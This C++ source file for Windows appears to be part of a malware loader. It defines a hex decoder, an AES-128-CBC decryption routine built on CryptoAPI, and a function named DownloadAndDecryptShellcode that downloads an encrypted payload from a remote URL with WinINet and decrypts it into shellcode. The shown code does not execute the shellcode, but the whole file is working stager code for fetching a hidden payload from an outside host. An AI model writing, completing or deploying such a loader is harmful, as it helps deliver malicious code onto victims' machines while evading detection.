#include "decrypt.h"
#include <wininet.h>
#include <iostream>
#include <sstream>
#include <windows.h>
#include <wincrypt.h>
#include <vector>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

struct Aes128KeyBlob {
    BLOBHEADER hdr;
    DWORD dwKeySize;
    BYTE bytes[16];
};


std::vector<BYTE> DecryptData(const std::vector<BYTE>& encryptedData,
    const std::vector<BYTE>& rawKey,
    const std::vector<BYTE>& iv) {
    std::vector<BYTE> decrypted;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    if (rawKey.size() != 16 || iv.size() != 16) {
        std::cerr << "Erreur : La clé et l'IV doivent faire 16 octets pour AES-128." << std::endl;
        return decrypted;
    }

    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
        return decrypted;
    }

    Aes128KeyBlob blob;
    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_128;
    blob.dwKeySize = 16;
    memcpy(blob.bytes, rawKey.data(), 16);

    if (!CryptImportKey(hProv, (BYTE*)&blob, sizeof(Aes128KeyBlob), 0, 0, &hKey)) {
        std::cerr << "CryptImportKey failed: " << GetLastError() << std::endl;
        CryptReleaseContext(hProv, 0);
        return decrypted;
    }

    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        std::cerr << "CryptSetKeyParam (mode) failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return decrypted;
    }

    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0)) {
        std::cerr << "CryptSetKeyParam (IV) failed: " << GetLastError() << std::endl;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return decrypted;
    }

    decrypted = encryptedData;
    DWORD dataLen = (DWORD)decrypted.size();

    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &dataLen)) {
        std::cerr << "CryptDecrypt failed: " << GetLastError() << std::endl;
        decrypted.clear();
    }
    else {
        decrypted.resize(dataLen);
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    return decrypted;
}


std::vector<BYTE> DownloadAndDecryptShellcode(std::string url, std::string cle_hex, std::string iv_hex) {
    std::vector<BYTE> encryptedShellcode;
    std::vector<BYTE> key = HexToBytes(cle_hex);
    std::vector<BYTE> iv = HexToBytes(iv_hex);

    HINTERNET h = InternetOpenA(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    if (!h) {
        std::cerr << "[-] InternetOpen failed" << std::endl;
        return encryptedShellcode;
    }

    HINTERNET u = InternetOpenUrlA(h, url.c_str(), 0, 0, 0, 0);
    if (!u) {
        std::cerr << "[-] InternetOpenUrl failed" << std::endl;
        InternetCloseHandle(h);
        return encryptedShellcode;
    }

    BYTE buf[4096];
    DWORD read;

    while (InternetReadFile(u, buf, sizeof(buf), &read) && read) {
        encryptedShellcode.insert(encryptedShellcode.end(), buf, buf + read);
    }

    InternetCloseHandle(u);
    InternetCloseHandle(h);

    std::cout << "[*] Downloaded encrypted: " << encryptedShellcode.size() << " bytes" << std::endl;


    std::vector<BYTE> decryptedShellcode = DecryptData(encryptedShellcode, key, iv);

    if (decryptedShellcode.empty()) {
        std::cerr << "[-] Decryption failed!" << std::endl;
        return decryptedShellcode;
    }

    std::cout << "[+] Decrypted shellcode: " << decryptedShellcode.size() << " bytes" << std::endl;

    return decryptedShellcode;
}
